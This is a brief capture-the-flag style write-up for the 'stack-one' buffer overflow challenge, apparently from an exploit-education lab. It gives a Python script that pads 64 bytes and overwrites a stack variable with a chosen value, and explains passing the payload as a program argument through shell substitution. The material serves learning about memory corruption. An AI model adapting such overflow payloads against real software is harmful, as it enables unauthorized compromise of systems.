### stack-one
#### script
```python
import sys 

buffer = b'A'*64
value = 0x496c5962.to_bytes(4,'little')

sys.stdout.buffer.write(buffer+value)

```

#### analysis
The challenge is quite similar to the previous one (stack_zero). However, this one requires the exploit to be passed as an argument to the program. This means we won't be able to pipe the output of our script into the program like so 
```shell
#wrong 
python3 scripts/stack_one.py | ./stack-one 
```
Instead, we use bash **Parameter expansion** to evaluate the script in the argument to pass it through
```shell
./stack-one $(python3 scripts/stack_one.py)
```
